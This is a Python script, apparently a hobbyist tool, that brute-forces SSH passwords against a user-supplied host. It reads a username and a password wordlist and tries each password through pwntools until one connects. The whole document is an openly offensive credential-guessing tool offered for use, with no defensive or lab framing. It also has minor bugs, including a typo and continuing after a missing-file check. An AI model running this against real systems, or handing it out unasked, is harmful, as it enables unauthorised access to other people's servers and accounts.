from pwn import *  # Import pwntools for easy SSH handling
import paramiko    # Import paramiko for handling SSH exceptions
import os          # Import os to check if file exists

# Get inputs from the user for host, username, and password file
host = input("Enter Host: ")
while host == "":
    print("Host can't be empty")
    host = input("Enter Host: ")

username = input("Enter Usernames: ")
while username == "":
    print("Username can't be empty")
    username = input("Enter Usernames: ")

password_list = input("Enter Passwords list: ")
attempts = 0

# Check if the password file exists before proceeding
if not os.path.exists(password_list):
    print("File not found. Please check the path.")
else:
    print("File found. Initiating Brute Force")

# Open the password file and iterate through each password
with open(password_list, "r") as pass_file:
    for password in pass_file:
        password = password.strip("\n") # Remove newlines and extra spaces
        try:
            print(f'{attempts} Attempting password: {password}')
            response = ssh(host=host, user=username , password=password, timeout=1)
            if response.connected():
                print(f'[>] valid password founr {password}')
                response.close()
                break
            else:
                response.close()

        # Handle incorrect password (authentication failure)
        except paramiko.ssh_exception.AuthenticationException:
            print("Password not found")
            print("Authentication failed")

        attempts += 1 # Increment attempt counter after each try
